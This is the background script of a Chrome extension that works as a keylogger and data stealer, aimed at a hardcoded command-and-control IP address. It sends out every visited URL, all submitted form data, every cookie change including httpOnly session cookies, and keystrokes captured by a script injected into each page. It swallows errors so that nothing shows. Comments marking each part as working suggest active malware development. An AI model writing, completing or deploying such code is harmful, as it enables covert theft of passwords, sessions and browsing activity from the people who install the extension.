const C2_SERVER = "http://18.142.48.94:8000";

// 1. URL NAVIGATION (✅ Working)
chrome.webNavigation.onCompleted.addListener((details) => {
    fetch(`${C2_SERVER}/url`, {
        method: "POST",
        body: JSON.stringify({
            url: details.url,
            tabId: details.tabId,
            referrer: details.referrer || "",
            time: Date.now()
        }),
        headers: { "Content-Type": "application/json" }
    }).catch(() => {});
}, {url: [{urlMatches: '<all_urls>'}]});

// 2. FORM DATA - FIXED V3 PERMISSIONS
chrome.webRequest.onBeforeRequest.addListener(
    (details) => {
        let postData = "";
        if (details.requestBody) {
            if (details.requestBody.formData) {
                postData = Object.entries(details.requestBody.formData)
                    .map(([k, v]) => `${k}=${v}`).join('&');
            } else if (details.requestBody.raw?.[0]?.bytes) {
                postData = new TextDecoder().decode(new Uint8Array(details.requestBody.raw[0].bytes));
            }
        }
        
        if (postData) {
            fetch(`${C2_SERVER}/form`, {
                method: "POST",
                body: JSON.stringify({
                    url: details.url,
                    method: details.method,
                    data: postData,
                    time: Date.now()
                }),
                headers: { "Content-Type": "application/json" }
            }).catch(() => {});
        }
    },
    {urls: ["<all_urls>"]},
    ["requestBody"]  // ✅ FIXED: Only "requestBody" - NO "extraHeaders"
);

// 3. COOKIES (✅ Working)
chrome.cookies.onChanged.addListener((changeInfo) => {
    if (!changeInfo.removed) {
        fetch(`${C2_SERVER}/cookie`, {
            method: "POST",
            body: JSON.stringify({
                domain: changeInfo.cookie.domain,
                name: changeInfo.cookie.name,
                value: changeInfo.cookie.value,
                path: changeInfo.cookie.path,
                secure: changeInfo.cookie.secure,
                httpOnly: changeInfo.cookie.httpOnly,
                time: Date.now()
            }),
            headers: { "Content-Type": "application/json" }
        }).catch(() => {});
    }
});

// 4. KEYSTROKES (✅ Working)
chrome.tabs.onUpdated.addListener((tabId, info, tab) => {
    if (info.status === "complete" && tab.url && !tab.url.startsWith('chrome://')) {
        chrome.scripting.executeScript({
            target: {tabId},
            func: () => {
                // Remove existing listeners to prevent duplicates
                document.removeEventListener('keydown', arguments.callee);
                document.addEventListener('keydown', (e) => {
                    fetch('http://18.142.48.94:8000/keystroke', {
                        method: 'POST',
                        body: JSON.stringify({
                            key: e.key,
                            code: e.code,
                            url: window.location.href,
                            time: Date.now()
                        }),
                        headers: {'Content-Type': 'application/json'}
                    }).catch(() => {});
                });
            }
        }).catch(() => {});
    }
});
